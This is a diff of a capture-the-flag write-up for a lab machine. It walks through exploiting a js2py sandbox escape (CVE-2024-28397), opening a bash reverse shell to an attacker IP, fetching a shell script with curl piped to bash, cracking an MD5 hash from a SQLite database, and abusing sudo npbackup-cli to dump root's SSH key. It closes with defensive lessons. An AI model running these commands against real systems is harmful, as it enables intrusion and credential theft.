@@ -1,77 +1,181 @@
 # CodePardTwo Writeup
 
-#1 Nmap
-$ sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.110  
+## 1. Enumeration
 
-22(ssh), 8000(http) is open  
-  
-visit 8000 via browser, and now we find website is running.  
-  
-we can download app by clicking "DOWNLOAD APP"  
-  
-$ unzip app.zip  
-$ cd app  
-$ la -la  
-  
-there is requiments.txt, which tell us the version of "js2py" is 0.74  
-->CVE-2024-28397  
-  
-we can run js code on the website, so get scripthttps://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py  
-  
-edit the script to excecute the code   
- curl http://{our ip}:8080/shell.sh |bash  
-  
-make the following reverse shell  
-$ cat shell.sh  
-#!/bin/bash  
-bash -i >& /dev/tcp/{our ip}/1234 0>&1  
-  
-$ python3 -m http.server 8080  
-$ nc -lnvp 1234  
-  
-now, we can execute the CVE script on the website, and we get reverse shell  
-  
-codeparttwo) pwd  
-~/app/instance  
-  
-codeparttwo) ls -la  
--> we can find "users.db"  
-get information of users.db by using "find" command.  
-code parttwo) find users.db  
--> now, we know sqlite is used.  
-codeparttwo) sqlite3 users.db  
-sqlite> .tables  
--> we can show tables with the command, and we find two tables code_snippet, user  
-sqlite> select * from user;  
-we get username: marco, and password hash!!  
-  
-copy the hash to our attacker machine, and hashid {hash}  
--> the hash is seems MD5  
-john --format-type=raw-md5 hash.txt  
-we can get password !!  
-so, get into the target machine with marco's credentials,  
-  
-[+] get user flag!! [+]  
-  
-  
-##3 root flag  
-marco) sudo -l  
--> marco can run npbackup-cli as admin.  
-with npbackup-cli, we can create backups with root directory  
-so, backup /root direcotory -> get ssh rsa_key of root  
-marco) npbackup.conf npbackup_cp.conf  
-marco) nano npbackup.conf  
-edit paths of backup: "/root"  
-  
-marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf -b -f  
-now, we have root directory backup.  
-marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --ls  
-there is ssh private key  
-marco) sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --duump /root/.ssh/id_rsa     
-copy the output to local file 'id_rsa'  
-ssh require that private key file is only be readabl/writable by file's creator.  
-$ chmod 600 id_rsa  
-$ ssh -i id_rsa root@{target ip}  
-  
-now, we get root shell and root flag!!  
+### Nmap Scan
 
+```bash
+sudo nmap -p- -sC -sV --min-rate 1000 10.129.3.110
+```
+
+Open ports:
+
+- 22 (SSH)
+- 8000 (HTTP)
+
+A web service was running on port 8000.
+
+---
+
+## 2. Initial Access
+
+### Source Code Analysis
+
+The web application allowed downloading the source code via the **"DOWNLOAD APP"** button.
+
+```bash
+unzip app.zip
+cd app
+ls -la
+```
+
+Inside `requirements.txt`:
+
+```
+js2py==0.74
+```
+
+This version is vulnerable to CVE-2024-28397 (js2py sandbox escape), which allows remote code execution by escaping the Python sandbox.
+
+Since the website allowed execution of JavaScript code, this vulnerability was exploitable.
+
+---
+
+### Exploitation
+
+A public PoC was modified to execute a reverse shell.
+
+Reverse shell payload:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/{ATTACKER_IP}/1234 0>&1
+```
+
+Start attacker services:
+
+```bash
+python3 -m http.server 8080
+nc -lnvp 1234
+```
+
+Triggering the exploit through the web interface resulted in a reverse shell.
+
+---
+
+## 3. User Privilege Escalation
+
+Inside the application directory:
+
+```bash
+pwd
+ls -la
+```
+
+A SQLite database file `users.db` was discovered.
+
+```bash
+sqlite3 users.db
+.tables
+select * from user;
+```
+
+Discovered:
+
+- Username: marco
+- Password hash (MD5)
+
+Crack the hash:
+
+```bash
+john --format=raw-md5 hash.txt
+```
+
+Recovered password allowed SSH login as `marco`.
+
+User flag obtained.
+
+---
+
+## 4. Root Privilege Escalation
+
+Check sudo permissions:
+
+```bash
+sudo -l
+```
+
+User `marco` can run:
+
+```
+/usr/local/bin/npbackup-cli
+```
+
+This backup tool can be abused to access restricted directories.
+
+---
+
+### Abusing npbackup-cli
+
+Modify backup configuration to include `/root`, then run:
+
+```bash
+sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf -b -f
+```
+
+List backup contents:
+
+```bash
+sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --ls
+```
+
+Identify root SSH private key:
+
+```
+/root/.ssh/id_rsa
+```
+
+Dump the key:
+
+```bash
+sudo /usr/local/bin/npbackup-cli -c npbackup_cp.conf --dump /root/.ssh/id_rsa
+```
+
+Fix permissions and connect:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa root@{TARGET_IP}
+```
+
+Root shell obtained.
+
+Root flag captured.
+
+---
+
+# What We Learned
+
+## 1. Outdated Dependencies Can Lead to RCE
+
+Using a vulnerable version of js2py allowed remote code execution through sandbox escape.
+
+---
+
+## 2. Storing Credentials in Application Directories Is Dangerous
+
+Exposed SQLite databases containing password hashes can lead to lateral movement if weak hashing algorithms (e.g., MD5) are used.
+
+---
+
+## 3. Weak Hashing Algorithms Are Risky
+
+MD5 is fast and easily crackable, making it unsuitable for password storage.
+
+---
+
+## 4. Sudo Misconfigurations Can Lead to Full Compromise
+
+Allowing backup tools to run as root enables attackers to read sensitive directories such as `/root`.
+
+Backup utilities should be strictly restricted.
